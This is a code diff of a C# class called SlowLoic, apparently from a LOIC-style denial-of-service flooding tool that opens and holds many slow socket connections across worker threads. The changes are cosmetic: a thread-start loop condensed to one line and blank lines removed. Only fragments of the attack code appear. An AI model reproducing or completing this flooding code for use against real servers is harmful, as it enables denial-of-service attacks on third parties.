@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Net.Sockets;
@@ -67,11 +67,7 @@ namespace GAS.Core
             if (IsFlooding)
                 Stop();
             IsFlooding = true;
-            for (int i = 0; i < ThreadCount; i++)
-            {
-                WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork));
-                WorkingThreads[i].Start(i);
-            }
+            for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++));
             init = true;
         }
         public override void Stop()
@@ -106,7 +102,6 @@ namespace GAS.Core
                 {
                     stop = DateTime.Now.AddMilliseconds(Timeout);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
-
                     // we have to do this really slow 
                     while (IsDelayed && (DateTime.Now < stop))
                     {
@@ -121,7 +116,6 @@ namespace GAS.Core
                         }
                         catch
                         { }
-
                         if (socket.Connected)
                         {
                             _lSockets[MY_INDEX_FOR_WORK].Add(socket);
@@ -151,7 +145,6 @@ namespace GAS.Core
                             Requested--;
                         }
                     }
-
                     States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                     IsDelayed = (_lSockets[MY_INDEX_FOR_WORK].Count < _nSockets);
                     if (!IsDelayed) System.Threading.Thread.Sleep(Timeout);
@@ -174,6 +167,4 @@ namespace GAS.Core
             }
         }
     } // class SlowLoic
-
-
 }
